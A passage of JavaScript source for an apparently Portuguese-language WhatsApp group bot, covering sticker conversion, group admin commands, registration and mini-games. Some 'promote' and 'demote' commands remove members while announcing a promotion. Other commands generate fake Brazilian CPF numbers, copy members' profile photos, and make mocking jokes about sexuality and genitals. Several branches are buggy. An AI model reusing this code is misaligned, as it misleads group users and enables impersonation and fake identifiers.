									.addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
									.toFormat('webp')
									.save(`./sticker/${sender}.webp`)
						} else {
							reply(`Send picture/video with caption ${prefix}stickerwm name|author or tagged image/video that has been sent\nNote: Maximum video duration is 10 seconds`)
						}
						break
//_LIMPA TODOS OS CHATS
case 'clearall':
if (!isOwner) return reply('Only Italu can do this')
anu = await tiringa.chats.all()
tiringa.setMaxListeners(25)
for (let _ of anu) {
tiringa.deleteChat(_.jid)
}
reply('all chats were deleted :)')
break

//_PROMOVE UM MEMBRO DO GRUPO
case 'promotedfrf':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
pro = 'Berhasil Promote\n'
for (let _ of mentioned) {
pro += `@${_.split('@')[0]}\n`
}
mentions(from, mentioned, true)
tiringa.groupRemove(from, mentioned)
} else {
mentions(`The user: @${mentioned[0].split('@')[0]} was promoted to the position of group administrator`, mentioned, true)
tiringa.groupMakeAdmin(from, mentioned)
}
break

//_ALTERA O NOME DO GRUPO
case 'setname':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
idgrup = `${from.split("@s.whatsapp.net")[0]}`;
tiringa.groupUpdateSubject(idgrup, `${body.slice(9)}`)
tiringa.sendMessage(from, 'group name changed', text, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

//_ALTERA A DESCRIÇÃO DO GRUPO
case 'setdesk':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
tiringa.groupUpdateDescription(from, `${body.slice(9)}`)
tiringa.sendMessage(from, 'group description changed', text, {
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

//_REBAIXA UM MEMBRO
case 'demotetttf':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
reb = '\n'
for (let _ of mentioned) {
reb += `@${_.split('@')[0]}\n`
}
mentions(reb, mentioned, true)
tiringa.groupRemove(from, mentioned)
} else {
mentions(`The user @${mentioned[0].split('@')[0]} was demoted to ordinary member`, mentioned, true)
tiringa.groupDemoteAdmin(from, mentioned)
}
break

//_LISTA OS ADMINISTRADORES DO GRUPO
case 'listadmins':
case 'listadmin':
case 'adminlist':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
adl = `Lista de administradores do grupo: ${groupMetadata.subject}\nTotal: ${groupAdmins.length}\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
adl += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(adl, groupAdmins, true)
break

//_ALTERA A FOTO DE PERFIL DO BOT
case 'setppbot':
tiringa.updatePresence(from, Presence.composing)
if (!isOwner) return reply(ptbr.ownerB())
const botpp = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contxtInfo: mek
const cuk = await tiringa.downloadAndSaveMediaMessage(botpp)
await tiringa.updateProfilePicture(botNumber, cuk)
reply('Thanks for the new profile photo')
break

//_LINK DO GRUPO
case 'linkgroup':
case 'linkgc':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
linkgc = await tiringa.groupInviteCode(from)
reply('Group link: https://chat.whatsapp.com/'+linkgc)
break

//_RETIRAR BOT DO GRUPO
case 'leave':
if (!isGroup) return reply(ptbr.group())
if (isGroupAdmins || isOwner) {
tiringa.groupLeave(from)
} else {
reply(ptbr.admin())
}
break

//_MENCIONA TODOS OS MEMBROS DO GRUPO 
case 'hidetag':
tiringa.updatePresence(from, Presence.composing) 
if (!isOwner) return reply(ptbr.ownerB())
if (!isGroup) return reply(ptbr.group())
htg = body.slice(9)
group = await tiringa.groupMetadata(from);
member = group['participants']
jids = [];
member.map( async adm => {
jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
text: htg,
contextInfo: {mentionedJid: jids},
thumbnail: dnsnew, sendEphemeral: true,quoted: mek
}
await tiringa.sendMessage(from, options, text)
break

//_CONVERTE STICKER EM IMAGEM
case 'toimg':
tiringa.updatePresence(from, Presence.composing)                       
if (!isQuotedSticker) return reply('You need to tag a non-animated sticker for this')
reply(ptbr.wait())
tomg = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medtmg = await tiringa.downloadAndSaveMediaMessage(tomg)
ran = getRandom('.png')
exec(`ffmpeg -i ${medtmg} ${ran}`, (err) => {
fs.unlinkSync(medtmg)
if (err) return reply('❌failed to convert sticker to image❌')
buffer = fs.readFileSync(ran)
tiringa.sendMessage(from, buffer, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: 'successful conversion'})
fs.unlinkSync(ran)
})
break
//await tiringa.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
case 'registrar':
case 'registrar':
case 'register':
case 'registra':
case 'registrar':
if (isUser) return  reply('yᴏᴜ ᴀʀe ᴀʟʀᴇᴀᴅy ʀᴇɢɪsᴛᴇʀᴇd')
if (!q.includes('|')) return reply(`ᴇɴᴛᴇr ᴄᴏʀʀᴇᴄᴛʟy: \nᴄᴏᴍᴍᴀɴd: ${prefix} ʀᴇɢɪsᴛᴇr ɴᴀᴍe|ᴀɢe \n ᴇxᴀᴍᴘʟe: ${prefix} ʀᴇɢɪsᴛᴇr sᴀғᴜ|18`)
// if (args.length < 1) return reply(`ᴇɴᴛᴇr ᴄᴏʀʀᴇᴄᴛʟy: \nᴄᴏᴍᴍᴀɴd: ${prefix} ʀᴇɢɪsᴛᴇr ɴᴀᴍe|ᴀɢe \n ᴇxᴀᴍᴘʟe: ${prefix} ʀᴇɢɪsᴛᴇr sᴀғᴜ|18`)
const namaUser = q.substring(0, q.indexOf('|') - 0)
const umurUser = q.substring(q.lastIndexOf('|') + 1)
const serialUser = createSerial(20)
if(isNaN(umurUser)) return reply(`ᴇɴᴛᴇr ᴄᴏʀʀᴇᴄᴛʟy: \nᴄᴏᴍᴍᴀɴd: ${prefix}ʀᴇɢɪsᴛᴇr ɴᴀᴍe|ᴀɢe \n ᴇxᴀᴍᴘʟe: ${prefix}ʀᴇɢɪsᴛᴇr sᴀғᴜ|18`)
if (namaUser.length >= 60) return reply(`ʏᴏᴜr ɴᴀᴍe ɪs ᴛᴏᴏ ʟᴏᴏng`)
if (umurUser > 40) return reply(`ᴍᴀxɪᴍᴜm ᴀɢe ɪs 40 yᴇᴀʀs`)
if (umurUser < 12) return reply(`ᴍɪɴɪᴍᴜm ᴀɢe ɪs 12 yᴇᴀʀs`)
veri = sender
try {
ppimg = 'https://i.ibb.co/rxPtZS8/foto.jpg'
} catch {
ppimg = 'https://i.ibb.co/rxPtZS8/foto.jpg'
}
captionnya = 
`  〘 *_ᴠᴇʀyғɪᴄᴀᴛɪᴏn sᴜᴄᴄᴇss_* 〙
   ᴄᴏᴅe: ${serialUser}
╔════════════════
╠≽️ ᴅᴀy: ${date}
╠≽️ ᴛɪᴍe: ${hr}
╠≽️ ᴜsᴇʀɴᴀᴍe: ${pushname}
╠≽️ ʀᴇɢɪsᴛʀᴀᴛɪᴏn ɴᴀᴍe: ${namaUser}
╠≽️ ᴀɢe: ${umurUser}
╠≽️ ʟɪɴk: wa.me/${sender.split("@")[0]}
╚════════════════
ʏᴏu ʀᴇɢɪsᴛᴇʀᴇd, ᴛyᴘe ${prefix}ᴍᴇɴu ᴛᴏ ʟɪst ᴍy ᴄᴏᴍᴍᴀɴᴅs `
daftarimg = await getBuffer(ppimg)
addRegisteredUser(sender, namaUser, umurUser, time, serialUser)
tiringa.sendMessage(from, daftarimg, image, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, caption: captionnya, contextInfo: {mentionedJid: [sender]}})                    
break

//_FECHA O GRUPO
case 'close':
tiringa.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
var nomor = mek.participant
const close = {
text: `Group closed by: @${nomor.split("@s.whatsapp.net")[0]}`,
contextInfo: {
mentionedJid: [nomor]
}
}
tiringa.groupSettingChange (from, GroupSettingChange.messageSend, true);
reply(close)
break

case 'cpf1':
cp1 = `${Math.floor(Math.random() * 300) +600}`
cp2 = `${Math.floor(Math.random() * 300) +600}`
cp3 = `${Math.floor(Math.random() * 300) +600}`
cp4 = `${Math.floor(Math.random() * 30) +60}`
cpf = `${cp1}.${cp2}.${cp3}-${cp4}`
tiringa.sendMessage(from, `CPF gerado: ${cpf}`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

//_ABRE O GRUPO
case 'openg':
case 'open':
  case 'abrirg':
tiringa.updatePresence(from, Presence.composing)
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins) return reply(ptbr.admin())
if (!isBotGroupAdmins) return reply(ptbr.Badmin())
open = {
  text: `Group opened by: @${sender.split("@")[0]}`,
  contextInfo: {
mentionedJid: [sender]
  }
}
tiringa.groupSettingChange (from, GroupSettingChange.messageSend, false)
tiringa.sendMessage(from, open, text, {
  thumbnail: dnsnew, sendEphemeral: true,quoted: mek
})
break

//_APAGA MENSAGENS ENVIADAS PELO BOT
case 'delete':
  case 'del':
  case 'd':
case 'apagar':
if (!isGroup)return reply(ptbr.group())
if (!isGroupAdmins)return reply(ptbr.admin())
try {
tiringa.deleteMessage(from, {
  id: mek.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true
})
} catch {
  reply('You can only delete messages from me')
}
break

case 'welcome':
if (!isGroup) return reply(ptbr.group())
if (!isGroupAdmins)return reply(ptbr.admin())
if (args.length < 1) return reply('use =welcome 1 to activate')
if (Number(args[0]) === 1) {
if (isWelkom) return reply('is already activated')
welkom.push(from)
fs.writeFileSync('./data/welkom.json', JSON.stringify(welkom))
reply('The welcome feature has been enabled')
} else if (Number(args[0]) === 0) {
welkom.splice(from, disable)
fs.writeFileSync('./data/welkom.json', JSON.stringify(welkom))
reply('Welcome feature has been disabled')
} else {
reply(`type ${prefix} welcome 1 to enable, 0 to disable the feature`)
}
break

case 'clone':
if (!isGroup) return reply(ptbr.group())
if (!isOwner) return reply(ptbr.ownerB())
if (args.length < 1) return reply('Mention who should steal the profile photo')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag cvk')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
try {
pp = await tiringa.getProfilePicture(id)
buffer = await getBuffer(pp)
tiringa.updateProfilePicture(botNumber, buffer)
mentions(`Roubei a foto de perfil de: @${id.split('@')[0]}`, [jid], true)
} catch (e) {
reply('an error has occurred')
}
break
			
//mini games, rate, random
case 'dado':
case 'roll':
msgFilter.isFiltered(from)
const dadus = ["⚀","⚁","⚂","⚃","⚄","⚅"]
dadu = dadus[Math.floor(Math.random() * dadus.length)]
dador = fs.readFileSync('./database/dados/'+dadu+'.webp')
tiringa.sendMessage(from, dador, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

case 'caracoroa':
msgFilter.isFiltered(from)
const cara = fs.readFileSync('./database/cara/cara.webp');
const coroa = fs.readFileSync('./database/cara/coroa.webp');
cararo = ["cara", "coroa"]
fej = cararo[Math.floor(Math.random() * cararo.length)]
gg = fej
reply(`You got it: ${fej}`)
cararoa = fs.readFileSync('./database/cara/'+fej+'.webp')
tiringa.sendMessage(from, cararoa, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break
                
case 'morte':
case 'death':
idde = ["30","76","90","72","83","73","83","74","92","100","94","48","37","53","63"]
idade = idde[Math.floor(Math.random() * (idde.length))]
morte = `People with this name: ${pushname} \nThey tend to die at ${idade} years old.`
reply(morte)
break
			
case 'sn':
const sn = ['yes', 'no']
gosto = body.slice(3)
if (args.length < 1) return tiringa.sendMessage(from, `You must ask a question...\nExample: ${prefix}sn Is Italu a lazy Bahian?`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
const jawab = sn[Math.floor(Math.random() * (sn.length))]
hasil = `${gosto}\n\nAccording to my calculations, I believe that... ${jawab}`
reply(hasil)
break
                   
case 'gadometro':
case 'gado':
var chifre = ["ultra-extreme-cattle", "Cattle-Master", "King-Cattle", "Gado", "Escravo-ceta", "Escravo-ceta Maximo", "Gacorno?", "Jogador De Forno Livre<3", "Mestre Do Frifai<3<3", "Gado-Manso", "Gado-Conformado", "Gado-Incubado", "Gado Deus", "Mestre dos Gados", "Topa tudo por buceta", "Gado Comum", "Mini Gadinho", "Gado Iniciante", "Gado Basico", "Gado Intermediario", "Gado Avançado", "Gado Profisional", "Gado Mestre", "Gado Chifrudo", "Corno Conformado", "Corno HiperChifrudo", "Chifrudo Deus", "Mestre dos Chifrudos"]
var gado = chifre[Math.floor(Math.random() * chifre.length)]
gadop = `${Math.floor(Math.random() * 100)}`
hisil = `You’re:\n\n${gado}`
reply(hisil)
break

case "rps":
msgFilter.isFiltered(from)
if (args.length < 1) return reply(ptbr.tterro())
ppt = ["rock","paper","sisor"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 13) + 349
pptb = ppy
pph = `You won ${ppg} in xp`
if ((pptb == "rock" && args == "paper") || 
(pptb == "paper" && args == "sisor") || 
(pptb == "sisor" && args == "rock")) {
var vit = "victory"
} else if ((pptb == "rock" && args == "sisor") || 
(pptb == "paper" && args == "rock") || 
(pptb == "sisor" && args == "paper")) {
var vit = "defeat"
} else if ((pptb == "rock" && args == "rock") ||
(pptb == "paper" && args == "paper") ||
(pptb == "sisor" && args == "sisor")) {
var vit = "a tie"
} else if (vit = "undefined") {
return reply(ptbr.tterro())
}
if (vit == "victory") {
var tes = "Player win"
}
if (vit == "defeat" ) {
var tes = "The victory is Walker-BOT"
}
if (vit == "tie" ) {
var tes = "The game ended in a draw"
}
reply(`Walker-BOT it played: ${pptb}\nThe player played: ${args}\n\n${tes}`)
if (tes == "Player win") {
reply(pph)
}
break

case 'top5':
try{
if(!isGroup) return reply(ptbr.group())
if (!isGroupAdmins)return reply(ptbr.admin())
d = []
top1 = body.slice(5)
teks = `️‍Top 5${top1}:\n`
for(i = 0; i < 5; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `️‍❧ @${groupMembers[r].jid.split('@')[0]}\n`
d.push(groupMembers[r].jid)
}
mentions(teks, d, true, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
} catch (e) {
console.log(e)
reply('an error has occurred')
}
break

case 'ship':
if (!isGroup) return reply(ptbr.group())
const ag = await tiringa.getgroupMetadata.participants(from)
const mem2 = ag[Math.floor(Math.random() * (ag.length))]
const mem1 = ag[Math.floor(Math.random() * (ag.length))]
casal = `@${mem1.jid.split('@')[0]}  teste @${mem2.jid.split('@')[0]}`
tiringa.sendMessage(from, casal, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, contextInfo: {"mentionedJid": [ag]}})
break
case 'therirandom':
const theri1 = ['🦋','🕷','🐝','🐉','🦆','🦅','🕊','🐧','🐦','🦇']
		   const theri11 = theri1[Math.floor(Math.random() * (theri1.length))]
	reply(`don't hot mwona`)
theri111 = 	`${theri11}`	
break
case 'slot':
msgFilter.isFiltered(from)
const somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
ppg = Math.floor(Math.random() * 13) + 349
if ((somtoy == '🥑 : 🥑 : 🥑') ||(somtoy == '🍉 : 🍉 : 🍉') ||(somtoy == '🍓 : 🍓 : 🍓') ||(somtoy == '🍎 : 🍎 : 🍎') ||(somtoy == '🍍 : 🍍 : 🍍') ||(somtoy == '🥝 : 🥝 : 🥝') ||(somtoy == '🍑 : 🍑 : 🍑') ||(somtoy == '🥥 : 🥥 : 🥥') ||(somtoy == '🍋 : 🍋 : 🍋') ||(somtoy == '🍐 : 🍐 : 🍐') ||(somtoy == '🍄 : 🍄 : 🍄') ||(somtoy == '🍒 : 🍒 : 🍒') ||(somtoy == '🔔 : 🔔 : 🔔') ||(somtoy == '🍊 : 🍊 : 🍊') ||(somtoy == '🍇 : 🍇 : 🍇')) {
var vitr = "You won!!!👑"
} else {
var vitr = "You lost...🎭"
}
const slott = 
`Get 3 of a kind to win
╔════ ≪ •❈• ≫ ════╗
║         [💰SLOT💰 | 🎰 ]        
║                                             
║                                             
║           ${somtoy}  ◄━━┛
║            
║                                           
║          [💰SLOT💰 | 🎰 ]        
╚════ ≪ •❈• ≫ ════╝
                      

${vitr}`
if (vitr == "You won!!!👑") {
setTimeout( () => {
reply(`You won ${ppg} in xp!!!`)
}, 1100)
}
tiringa.sendMessage(from, slott, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
break

case 'chance':
tiringa.updatePresence(from, Presence.composing) 
var avb = body.slice(7)
if (args.length < 1) return tiringa.sendMessage(from, `You need to type correctly\nExample: ${prefix}chance Italu being a muggle`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
random = `${Math.floor(Math.random() * 100)}`
hasil = `A chance ${body.slice(7)}\n\nit’s from... ${random}%`
tiringa.sendMessage(from, hasil, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, contextInfo: {mentionedJid: [sender]}})
break
     
case 'rola':
case 'pau':
random = `${Math.floor(Math.random() * 35)}`
const tamanho = random
//var (isNaN(tamanho))
if (tamanho < 13 ) {pp = 'just phimosis'} else if (tamanho == 13 ) {pp = 'passed the average😳'} else if (tamanho == 14 ) {pp = 'passed the average😳'} else if (tamanho == 15 ) {pp = 'hey, are you going to get mango?'} else if (tamanho == 16 ) {pp = 'hey, are you going to get mango?'} else if (tamanho == 17 ) {pp = 'calm man, the mine is not a well😳'} else if (tamanho == 18 ) {pp = 'calm man, the mine is not a well😳'} else if (tamanho == 19 ) {pp = 'calm man, the mine is not a well😳'} else if (tamanho == 20 ) {pp = 'you have a pole between your legs'} else if (tamanho == 21 ) {pp = 'you have a pole between your legs'} else if (tamanho == 22 ) {pp = 'you have a pole between your legs'} else if (tamanho == 23 ) {pp = 'you have a pole between your legs'} else if (tamanho == 24 ) {pp = 'you have a pole between your legs'} else if (tamanho > 25 ) {pp = 'will you look for oil with this?'
}
hasil = `Seu pau tem ${random}cm\n\n${pp}`
reply(hasil)
break
   
case 'gay':
tiringa.updatePresence(from, Presence.composing) 
random = `${Math.floor(Math.random() * 100)}`
boiola = random
if (boiola < 20 ) {bo = 'hmm... you are straight😔'} else if (boiola == 21 ) {bo = '+/- boiola'} else if (boiola == 23 ) {bo = '+/- boiola'} else if (boiola == 24 ) {bo = '+/- boiola'} else if (boiola == 25 ) {bo = '+/- boiola'} else if (boiola == 26 ) {bo = '+/- boiola'} else if (boiola == 27 ) {bo = '+/- boiola'} else if (boiola == 28 ) {bo = '+/- boiola'} else if (boiola == 29 ) {bo = '+/- boiola'} else if (boiola == 30 ) {bo = '+/- boiola'} else if (boiola == 31 ) {bo = 'I have my distrust...😑'} else if (boiola == 32 ) {bo = 'I have my distrust...😑'} else if (boiola == 33 ) {bo = 'I have my distrust...😑'} else if (boiola == 34 ) {bo = 'I have my distrust...😑'} else if (boiola == 35 ) {bo = 'I have my distrust...😑'} else if (boiola == 36 ) {bo = 'I have my distrust...😑'} else if (boiola == 37 ) {bo = 'I have my distrust...😑'} else if (boiola == 38 ) {bo = 'I have my distrust...😑'} else if (boiola == 39 ) {bo = 'I have my distrust...😑'} else if (boiola == 40 ) {bo = 'I have my distrust...😑'} else if (boiola == 41 ) {bo = 'you are right?😏'} else if (boiola == 42 ) {bo = 'you are right?😏'} else if (boiola == 43 ) {bo = 'you are right?😏'} else if (boiola == 44 ) {bo = 'you are right?😏'} else if (boiola == 45 ) {bo = 'you are right?😏'} else if (boiola == 46 ) {bo = 'you are right?😏'} else if (boiola == 47 ) {bo = 'you are right?😏'} else if (boiola == 48 ) {bo = 'you are right?😏'} else if (boiola == 49 ) {bo = 'you are right?😏'} else if (boiola == 50 ) {bo = 'you are or not?🧐'} else if (boiola > 51) {bo = 'you are gay🙈'
}
hasil = `You’re ${random}% gay\n\n${bo}`
reply(hasil)
break

case 'roleta':
const tiro = ["vazio","vazio","vazio","vazio","vazio","vazio","vazio","vazio","pow","pow"]
const figr = ["pattta1","pattta2","pattta3"]
tpa = tiro[Math.floor(Math.random() * (tiro.length))]	
tpb = figr[Math.floor(Math.random() * (figr.length))]
figb = fs.readFileSync('./src/'+tpb+'.webp')
if (tpa == "vazio") {
var morte = "You were lucky this time, the drum was empty."
} else if (tpa == "pow") {
var morte = "There was a bullet in the drum, POW!"
}
if (morte == "There was a bullet in the drum, POW!") {
setTimeout( () => {
tiringa.sendMessage(from, figb, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}, 2100)
}
setTimeout( () => {
tiringa.sendMessage(from, morte, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}, 2300)
break

//_JOGO DA VELHA By: Resen
//INICIO DO JOGO DA VELHA ❌ ⭕ 🔲
case 'ttt':
const limitrl = getLimit(sender, daily)
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "on") {
reply(`Someone is already playing at the moment\nPlease wait a moment...`)
} else if (tttset.waitingTime == "on") {
reply(`Someone recently played\nPlease wait for the lead time...`)
} else if (args == 0 || (args != 'easy' && args != 'Easy' && args != 'EASY' && args != 'normal' && args != 'Normal' && args != 'NORMAL' && args != 'hard' && args != 'Hard' && args != 'HARD'&& args != 'impossible'&& args != 'Impossible' && args != 'IMPOSSIBLE')) {
reply(`Set the difficulty\nEx.: ${prefix}ttt easy\n\nDifficulties: easy, normal, hard, impossible`)
} else if (limitrl !== undefined && cdd - (Date.now() - limitrl) > 0) {
reply('Oops, let your shelters play too, try again in 8 minutes.')
} else {
tttset.tttstatus = "on"
tttset.player = sender
tttset.playerName = pushname
tttset.mentionPlayer = mek
tttset.local = from
if (args == 'easy' || args == 'Easy' || args == 'EASY') {
tttset.tttdifficulty = "EASY"
} else if (args == 'normal' || args == 'Normal' || args == 'NORMAL') {
tttset.tttdifficulty = "NORMAL"
} else if (args == 'hard' || args == 'Hard' || args == 'HARD') {
tttset.tttdifficulty = "HARD"
} else if (args == 'impossible' || args == 'Impossible' || args == 'IMPOSSIBLE') {
tttset.tttdifficulty = "IMPOSSIBLE"
}
const randomStartIA = Math.floor(Math.random() * 3)
if (randomStartIA == 0) {
IA()
tttset.reActivate1 = "on"	
}
costum(`The game started!!!\nMode: ${tttset.tttdifficulty}`, text, tescuk, crtt)
tiringa.sendMessage(from, `🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`,text )
tiringa.sendMessage(from,`If you don’t know how to play, type: ${prefix}ttthelp`, text) 
setTimeout( () => {
tttset.waitingTime = "off"
tttset.autoEndTime = "on"
}, 240000) //4 minutos
addLimit(sender, daily)
}
break

case 'ttthelp':
tiringa.sendMessage(from, ttthelp(prefix), text)
break

case 'tttme':
if (!isGroup) return reply(ptbr.group())
const checkTTTIdMe = getTTTId(sender)
if (checkTTTIdMe === undefined) addTTTId(sender)
tiringa.sendMessage(from, tttme(pushname, getTTTwins(sender), getTTTdefeats(sender), getTTTties(sender), getTTTpoints(sender)), text, {thumbnail: dnsnew, sendEphemeral: true,quoted:mek})
break

case 'tttrank':
if (!isGroup) return reply(ptbr.group())
//if (tictactoe.length < 3) return reply(`Hmm, it is necessary that at least 3 people have played...`)
tictactoe.sort((a, b) => (a.points < b.points) ? 1 : -1)
mentioned_jid = []
let board = '【 TTT RANKS 】\n\n'
try {
for (let i = 0; i < 3; i++) {
if (i == 0) {board += `${i + 1}º 🥇 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Wins: ${tictactoe[i].wins} 🎊\n│ ➣ Defeats: ${tictactoe[i].defeats} 💥\n│ ➣ Ties: ${tictactoe[i].ties} 🌀\n│ ➣ Points: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 1) {board += `${i + 1}º 🥈 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Wins: ${tictactoe[i].wins} 🎊\n│ ➣ Defeats: ${tictactoe[i].defeats} 💥\n│ ➣ Ties: ${tictactoe[i].ties} 🌀\n│ ➣ Points: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
} else if (i == 2) {board += `${i + 1}º 🥉 : @${tictactoe[i].jid.split('@')[0]}\n╭╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n│ ➣ Wins: ${tictactoe[i].wins} 🎊\n│ ➣ Defeats: ${tictactoe[i].defeats} 💥\n│ ➣ Ties: ${tictactoe[i].ties} 🌀\n│ ➣ Points: ${tictactoe[i].points} ✨\n╰╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸\n\n`
}
mentioned_jid.push(tictactoe[i].jid)
} 
mentions(board, mentioned_jid, true)
} catch (err) {
console.log(err)
await tiringa.sendMessage(from, `Hmm, it is necessary that at least 3 people have played...`, text, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek})
}
break

case 'coord' :
tttset.playertest = sender
if (!isGroup) {
reply(ptbr.group())
} else if (tttset.tttstatus == "off") {
reply(`You haven’t started the game yet\nEnter ${prefix}ttt [DIFFICULTY] to start`)
} else if (tttset.player != tttset.playertest) {
reply(`Someone is already playing at the moment\Please wait a moment...`)
} else if (tttset.tttantibug == "on") {
reply(`Wait for the previous action to complete...`)
} else {
tttset.tttantibug = "on"
const coordX = args
if (coordX != 'a1' && coordX != 'a2' && coordX != 'a3' &&
coordX != 'b1' && coordX != 'b2' && coordX != 'b3' &&
coordX != 'c1' && coordX != 'c2' && coordX != 'c3') {
reply(`Enter the command with a coordinate\nExample: ${prefix}coord a1`)
tttset.tttantibug = "off"
} else {
switch (args[0]) {
case 'a1':
if (esp.a1 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.a1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a2':
if (esp.a2 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.a2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'a3':
if (esp.a3 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.a3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b1':
if (esp.b1 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.b1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b2':
if (esp.b2 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.b2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'b3':
if (esp.b3 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.b3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c1':
if (esp.c1 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.c1 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c2':
if (esp.c2 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.c2 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
case 'c3':
if (esp.c3 != "🔲") {
reply('The space has already been occupied\nTry another coordinate')
} else {
esp.c3 = "❌"
while (tttset.reActivate1 == "on") {
IA()
}
}
break
}
tttset.reActivate1 = "on"
reply(`🌀1️⃣2️⃣3️⃣\n🅰️${esp.a1}${esp.a2}${esp.a3}\n🅱️${esp.b1}${esp.b2}${esp.b3}\n©️${esp.c1}${esp.c2}${esp.c3}`)
var randomTTTXP = 0
if (WinnerX()) {
if (isLevelingOn) {
switch (tttset.tttdifficulty) {
case "EASY":
randomTTTXP = Math.floor(Math.random() * 25) + 25
addLevelingXp(tttset.player, randomTTTXP)
break
case "NORMAL":
randomTTTXP = Math.floor(Math.random() * 75) + 75
addLevelingXp(tttset.player, randomTTTXP)
break
case "HARD":
randomTTTXP = Math.floor(Math.random() * 200) + 200
addLevelingXp(tttset.player, randomTTTXP)
break
case "IMPOSSIBLE":
randomTTTXP = Math.floor(Math.random() * 1000) + 1000
addLevelingXp(tttset.player, randomTTTXP)
break
}
tiringa.sendMessage(from, `🎉🎉 PLAYER VICTORY 🎉🎉\n\n➣  REWARD: +${randomTTTXP} XP 🔮`, text)
} else {
tiringa.sendMessage(from, `🎉🎉 PLAYER VICTORY 🎉🎉`, text)
}
const currentTTTwins = getTTTwins(tttset.player)
const checkTTTIdWin = getTTTId(tttset.player)
